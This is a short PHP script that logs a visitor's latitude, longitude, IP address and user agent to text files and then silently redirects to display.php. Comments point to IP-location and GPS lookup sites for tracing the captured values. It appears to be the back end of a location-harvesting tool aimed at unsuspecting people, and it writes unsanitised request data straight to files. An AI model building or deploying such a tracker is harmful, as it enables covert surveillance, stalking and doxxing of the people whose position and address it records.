<?php 
$myfile = fopen("location.txt", "w");
$txt = "Lat: " . $_GET['lat'] . "\nLong: " . $_GET['long'] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nOS: " . $_GET['uagent'] ;

// $txt = "IP: " . $_SERVER["REMOTE_ADDR"] . "\nOS: " . $_GET['uagent'];

// iplocation.net 
//for ip
// gps-coordinates.net/gps-coordinates-converter 
//for gps

fwrite($myfile, $txt);
fclose($myfile);

$lat = $_GET['lat'];
$long = $_GET['long'];
$ip = $_SERVER["REMOTE_ADDR"];
$phone = $_GET['uagent'];


function show($lat, $long, $ip, $phone) {
    $location = "file.txt";
    $file = fopen($location, 'a');
    fwrite($file, $lat . "," . $long . "," . $ip . "," . $phone . "\n");
    fclose($file);
}

show($lat, $long, $ip, $phone);
header("Location: display.php");
exit();
?>